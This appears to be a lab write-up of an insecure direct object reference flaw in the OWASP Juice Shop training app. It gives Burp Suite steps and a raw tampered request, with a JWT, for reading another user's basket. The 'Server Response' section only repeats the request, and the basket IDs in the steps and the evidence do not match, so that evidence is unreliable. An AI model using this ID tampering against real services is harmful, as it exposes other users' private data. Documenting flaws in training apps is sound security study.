## 1. Executive Summary
- *Vulnerability:* Insecure Direct Object Reference (IDOR)
- *OWASP Top 10:* A01:2021 / A01:2025 - Broken Access Control
- *CWE:* CWE-639 (Authorization Bypass Through User-Controlled Key)
- *Endpoint:* GET /rest/basket/{id}
- *Severity:* High (CVSS 6.5)

---

## 2. Vulnerability Description & Root Cause
The Juice Shop web application exposes an API endpoint to retrieve shopping cart line items. The backend relies on a client-supplied integer ID in the URL route (/rest/basket/{id}). 

While the user is required to supply a valid JWT authentication token, the server application layer does not cross-examine the userId claim encoded in the token against the owner ID associated with the basket in the database. As a result, any valid user can view another user's cart contents.

---

## 3. Reproduction Steps

1. Log in to OWASP Juice Shop as an authenticated user (user1).
2. Add any item to the basket to trigger cart requests.
3. In Burp Suite *Proxy > HTTP history*, locate the request made to GET /rest/basket/1[span_4](start_span)[span_4](end_span).
4. Send the request to *Repeater* (Ctrl + R).
5. Change the target basket ID from 1 to 2.
6. Click *Send*.

---

## 4. Evidence (Raw HTTP Traffic from Burp Suite)

### Tampered Request:

GET /rest/basket/6 HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InNpbXBsZWJAZW1haWwiLCJwYXNzd29yZCI6ImYwODk4YWY5NDlhMzczZTcyYTRmNmEzNGI0ZGU5MDkwIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3OTQwNzU0NzZ9.fmroIdLVKwi4LyLtGC5ix_u-MIYyQBQTkJP2g94tsrmXxgc8zXQE_OzK-gu1TQAAQX6j_0nMmfD3BaOSjsuv37dmltPQYB4wCLhrYyiodBRhSMK3eoQOAoNWct5evXl54M5f8K8pWAnXLz6B77JdPJjWhyzmXjocste5zlVucJo
Accept-Language: en-GB,en;q=0.9
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-User-Email: simpleb@email
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; continueCode=4kO8boDM4Xq2QLbxP9ZwWEOYaVo8G7nLdkBp7eJryN1lK6zn3jm5RgvPaV3Q; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InNpbXBsZWJAZW1haWwiLCJwYXNzd29yZCI6ImYwODk4YWY5NDlhMzczZTcyYTRmNmEzNGI0ZGU5MDkwIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3OTQwNzU0NzZ9.fmroIdLVKwi4LyLtGC5ix_u-MIYyQBQTkJP2g94tsrmXxgc8zXQE_OzK-gu1TQAAQX6j_0nMmfD3BaOSjsuv37dmltPQYB4wCLhrYyiodBRhSMK3eoQOAoNWct5evXl54M5f8K8pWAnXLz6B77JdPJjWhyzmXjocste5zlVucJo
If-None-Match: W/"9a-sa/sksqfiMW+PpQf2hG3F4Ee4Xw"
Connection: keep-alive

Server Response:

GET /rest/basket/6 HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InNpbXBsZWJAZW1haWwiLCJwYXNzd29yZCI6ImYwODk4YWY5NDlhMzczZTcyYTRmNmEzNGI0ZGU5MDkwIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3OTQwNzU0NzZ9.fmroIdLVKwi4LyLtGC5ix_u-MIYyQBQTkJP2g94tsrmXxgc8zXQE_OzK-gu1TQAAQX6j_0nMmfD3BaOSjsuv37dmltPQYB4wCLhrYyiodBRhSMK3eoQOAoNWct5evXl54M5f8K8pWAnXLz6B77JdPJjWhyzmXjocste5zlVucJo
Accept-Language: en-GB,en;q=0.9
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-User-Email: simpleb@email
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; continueCode=4kO8boDM4Xq2QLbxP9ZwWEOYaVo8G7nLdkBp7eJryN1lK6zn3jm5RgvPaV3Q; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InNpbXBsZWJAZW1haWwiLCJwYXNzd29yZCI6ImYwODk4YWY5NDlhMzczZTcyYTRmNmEzNGI0ZGU5MDkwIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0wNyAxODoxNzo0OC4zMzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3OTQwNzU0NzZ9.fmroIdLVKwi4LyLtGC5ix_u-MIYyQBQTkJP2g94tsrmXxgc8zXQE_OzK-gu1TQAAQX6j_0nMmfD3BaOSjsuv37dmltPQYB4wCLhrYyiodBRhSMK3eoQOAoNWct5evXl54M5f8K8pWAnXLz6B77JdPJjWhyzmXjocste5zlVucJo
If-None-Match: W/"9a-sa/sksqfiMW+PpQf2hG3F4Ee4Xw"
Connection: keep-alive

![Burp Suite Repeater Poc] (../idor-poc.png)
